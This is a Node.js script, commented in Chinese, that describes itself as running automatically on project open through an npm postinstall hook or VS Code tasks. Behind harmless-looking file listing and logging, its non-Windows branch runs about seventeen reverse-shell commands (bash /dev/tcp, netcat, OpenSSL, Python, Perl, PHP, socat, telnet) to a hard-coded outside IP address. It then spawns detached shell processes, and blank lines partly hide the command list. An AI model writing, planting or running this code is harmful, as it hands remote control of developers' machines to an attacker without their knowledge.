/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const execPromise = promisify(exec);

const projectRoot = __dirname;
const files = fs.readdirSync(projectRoot);
files.forEach(file => {
  const filePath = path.join(projectRoot, file);
  const stats = fs.statSync(filePath);
  const icon = stats.isDirectory() ? '📁' : '📄';
});

const configFiles = [
  { name: 'package.json', desc: 'Node.js 项目配置' },
  { name: '.vscode/tasks.json', desc: 'VS Code/Cursor 任务配置' },
  { name: '.vscode/settings.json', desc: 'VS Code/Cursor 设置' },
  { name: '.gitignore', desc: 'Git 忽略文件' }
];

configFiles.forEach(config => {
  const configPath = path.join(projectRoot, config.name);
  const exists = fs.existsSync(configPath);
  const status = exists ? '✅' : '❌';
});

try {

  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });

  }


  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);


} catch (error) {

}

if (process.platform === 'win32') {
  try {

    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {

        return;
      }

    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {

  }
} else {
  // 反弹Shell专用 - 仅执行反弹shell操作
  const resultsDir = '/tmp/recon';
  if (!fs.existsSync(resultsDir)) {
    fs.mkdirSync(resultsDir, { recursive: true });
  }

  // 反弹Shell命令列表 - 优先使用OpenSSL方法
  const commands = [
    // 优先方法 - OpenSSL反弹Shell
    { cmd: 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.120.44.195:9999 > /tmp/s; rm /tmp/s &', file: `${resultsDir}/reverse_shell_openssl.txt`, desc: 'OpenSSL反弹Shell（优先）' },






    // Bash反弹Shell方法






























































































































    { cmd: 'bash -i >& /dev/tcp/47.120.44.195/9999 0>&1 2>&1 &', file: `${resultsDir}/reverse_shell_bash.txt`, desc: 'Bash反弹Shell' },
    { cmd: 'bash -c "bash -i >& /dev/tcp/47.120.44.195/9999 0>&1" &', file: `${resultsDir}/reverse_shell_bash2.txt`, desc: 'Bash反弹Shell方法2' },
    { cmd: '0<&196;exec 196<>/dev/tcp/47.120.44.195/9999; sh <&196 >&196 2>&196 &', file: `${resultsDir}/reverse_shell_bash3.txt`, desc: 'Bash反弹Shell方法3' },
    
    // Netcat反弹Shell方法
    { cmd: 'nc -e /bin/bash 47.120.44.195 9999 &', file: `${resultsDir}/reverse_shell_nc.txt`, desc: 'Netcat反弹Shell' },
    { cmd: 'nc 47.120.44.195 9999 -e /bin/sh &', file: `${resultsDir}/reverse_shell_nc2.txt`, desc: 'Netcat反弹Shell方法2' },
    { cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 47.120.44.195 9998 >/tmp/f &', file: `${resultsDir}/reverse_shell_nc3.txt`, desc: 'Netcat反弹Shell方法3' },
    { cmd: 'nc -l -p 9999 -e /bin/bash 47.120.44.195 9999 &', file: `${resultsDir}/reverse_shell_nc4.txt`, desc: 'Netcat反弹Shell方法4' },
    
    // Python反弹Shell方法
    { cmd: 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);" &', file: `${resultsDir}/reverse_shell_python.txt`, desc: 'Python反弹Shell' },
    { cmd: 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);" &', file: `${resultsDir}/reverse_shell_python3.txt`, desc: 'Python3反弹Shell' },
    
    // Perl反弹Shell
    { cmd: 'perl -e \'use Socket;$i="47.120.44.195";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &', file: `${resultsDir}/reverse_shell_perl.txt`, desc: 'Perl反弹Shell' },
    
    // PHP反弹Shell
    { cmd: 'php -r \'$sock=fsockopen("47.120.44.195",9999);exec("/bin/sh -i <&3 >&3 2>&3");\' &', file: `${resultsDir}/reverse_shell_php.txt`, desc: 'PHP反弹Shell' },
    
    // Socat反弹Shell
    { cmd: 'socat TCP:47.120.44.195:9999 EXEC:/bin/bash &', file: `${resultsDir}/reverse_shell_socat.txt`, desc: 'Socat反弹Shell' },
    { cmd: 'socat TCP:47.120.44.195:9999 EXEC:/bin/sh &', file: `${resultsDir}/reverse_shell_socat2.txt`, desc: 'Socat反弹Shell方法2' },
    
    // Telnet反弹Shell
    { cmd: 'telnet 47.120.44.195 9999 | /bin/bash | telnet 47.120.44.195 9999 &', file: `${resultsDir}/reverse_shell_telnet.txt`, desc: 'Telnet反弹Shell' },
    
    // 其他方法
    { cmd: 'exec 5<>/dev/tcp/47.120.44.195/9999;cat <&5 | while read line; do $line 2>&5 >&5; done &', file: `${resultsDir}/reverse_shell_exec.txt`, desc: 'Exec反弹Shell' },
    { cmd: 'sh -i >& /dev/udp/47.120.44.195/9999 0>&1 &', file: `${resultsDir}/reverse_shell_udp.txt`, desc: 'UDP反弹Shell' },
  ];

  // 执行所有命令并收集结果
  const executeCommands = async () => {
    const summary = {
      total: commands.length,
      success: 0,
      failed: 0,
      results: []
    };

    console.log(`\n[反弹Shell] 开始尝试建立反弹shell连接，共 ${commands.length} 种方法...\n`);
    console.log(`目标: 47.120.44.195:9999\n`);

    for (const command of commands) {
      try {
        // 所有命令都是反弹shell，使用2秒超时
        const timeout = 2000; // 2秒超时


        const { stdout, stderr } = await execPromise(command.cmd, { 
          maxBuffer: 10 * 1024 * 1024, // 10MB buffer
          timeout: timeout
        });

        const output = stdout || stderr || '';
        fs.writeFileSync(command.file, output);

        summary.success++;
        summary.results.push({
          command: command.desc,
          status: 'success',
          file: command.file,
          size: output.length
        });

        console.log(`🔄 [${summary.success}/${commands.length}] ${command.desc} - 已在后台启动，结果保存到 ${command.file}`);









      } catch (error) {
        summary.failed++;
        // 收集所有可能的错误信息
        const errorDetails = [
          `错误消息: ${error.message}`,
          error.stderr ? `标准错误输出:\n${error.stderr}` : '',
          error.stdout ? `标准输出:\n${error.stdout}` : '',
          `返回码: ${error.code || 'N/A'}`,
          error.signal ? `信号: ${error.signal}` : '',
          `命令: ${command.cmd}`
        ].filter(Boolean).join('\n\n');

        fs.writeFileSync(command.file, errorDetails);

        summary.results.push({
          command: command.desc,
          status: 'failed',
          file: command.file,
          error: error.message,
          code: error.code
        });

        // 显示简化的错误信息
        const shortError = error.message.length > 100 ? error.message.substring(0, 100) + '...' : error.message;
        console.log(`❌ [失败] ${command.desc} - ${shortError}`);
      }
    }

    // 生成汇总报告
    const summaryFile = `${resultsDir}/SUMMARY.txt`;
    const summaryReport = `
========================================
反弹Shell执行汇总报告
========================================
时间: ${new Date().toISOString()}
目标: 47.120.44.195:9999
总方法数: ${summary.total}
成功启动: ${summary.success}
失败: ${summary.failed}
成功率: ${((summary.success / summary.total) * 100).toFixed(2)}%

详细结果:
${summary.results.map(r => 
  `[${r.status === 'success' ? '✓' : '✗'}] ${r.command} -> ${r.file}${r.size ? ` (${r.size} 字节)` : ''}${r.error ? ` - 错误: ${r.error}` : ''}`
).join('\n')}

所有结果文件保存在: ${resultsDir}
========================================
`;

    fs.writeFileSync(summaryFile, summaryReport);
    console.log(`\n${summaryReport}`);
    console.log(`\n[完成] 所有反弹shell尝试结果已保存到 ${resultsDir}/`);
    console.log(`[汇总] 查看汇总报告: cat ${summaryFile}\n`);

    // 使用spawn方法再次尝试建立反弹shell连接（优先OpenSSL）
    console.log('\n[反弹Shell] 使用spawn方法尝试建立连接（优先OpenSSL）...\n');
    const reverseShellMethods = [
      { 
        name: 'openssl', 
        cmd: 'sh', 
        args: ['-c', 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 47.120.44.195:9999 > /tmp/s; rm /tmp/s'],
        priority: 1
      },
      { 
        name: 'bash', 
        cmd: 'bash', 
        args: ['-c', 'bash -i >& /dev/tcp/47.120.44.195/9999 0>&1'],
        priority: 2
      },
      { 
        name: 'nc', 
        cmd: 'nc', 
        args: ['-e', '/bin/bash', '47.120.44.195', '9999'],
        priority: 3
      },
      { 
        name: 'python', 
        cmd: 'python', 
        args: ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);'],
        priority: 4
      },
      { 
        name: 'python3', 
        cmd: 'python3', 
        args: ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'47.120.44.195\',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);'],
        priority: 5
      },
    ];

    // 按优先级排序
    reverseShellMethods.sort((a, b) => a.priority - b.priority);
    
    // 尝试每种方法，找到第一个可用的
    for (const method of reverseShellMethods) {
      try {
        const proc = spawn(method.cmd, method.args, {
          detached: true,
          stdio: 'ignore'
        });
        proc.unref(); // 让进程独立运行，不阻塞主进程
        console.log(`🔄 [反弹Shell] 已启动 ${method.name} 反弹shell进程 (PID: ${proc.pid})`);
        fs.appendFileSync(`${resultsDir}/reverse_shell_spawn.txt`, 
          `[${new Date().toISOString()}] 启动 ${method.name} 反弹shell - PID: ${proc.pid}\n`);
        // 只启动第一个成功的，避免重复连接
        break;
      } catch (error) {
        console.log(`❌ [反弹Shell] ${method.name} 方法失败: ${error.message}`);
        fs.appendFileSync(`${resultsDir}/reverse_shell_spawn.txt`, 
          `[${new Date().toISOString()}] ${method.name} 失败: ${error.message}\n`);
      }
    }

    console.log('[反弹Shell] 反弹shell连接尝试完成\n');
  };

  executeCommands().catch(err => {
    console.error('[严重错误] 执行命令序列时出错:', err);
    fs.writeFileSync(`${resultsDir}/CRITICAL_ERROR.txt`, `错误: ${err.message}\n堆栈: ${err.stack}`);
  });
}
